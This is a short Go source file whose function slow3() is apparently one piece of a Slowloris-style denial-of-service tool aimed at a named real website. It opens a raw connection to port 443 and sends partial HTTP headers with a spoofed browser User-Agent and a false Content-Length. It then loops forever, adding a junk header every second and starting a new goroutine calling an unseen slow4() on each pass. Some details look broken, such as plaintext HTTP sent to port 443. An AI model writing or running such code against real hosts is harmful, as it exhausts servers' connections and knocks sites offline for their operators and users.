package main

import (
	"fmt"
	"net"
	"time"
)

func slow3() {
	conn, err := net.Dial("tcp", "thawdezin.netlify.app:443")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: thawdezin.netlify.app\r\n")
	fmt.Fprintf(conn, "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n")
	fmt.Fprintf(conn, "Content-Type: text/plain\r\n")
	fmt.Fprintf(conn, "Connection: keep-alive\r\n")
	fmt.Fprintf(conn, "Accept-Encoding: gzip, deflate\r\n")
	fmt.Fprintf(conn, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")

	// Send partial request
	fmt.Fprintf(conn, "Content-Length: 10000\r\n\r\n")

	// Keep connection alive
	for {
		fmt.Fprintf(conn, "X-a: b\r\n")
		time.Sleep(time.Second)
		go func(){
			slow4()
		}()
		
		print("slow3")
	}
}
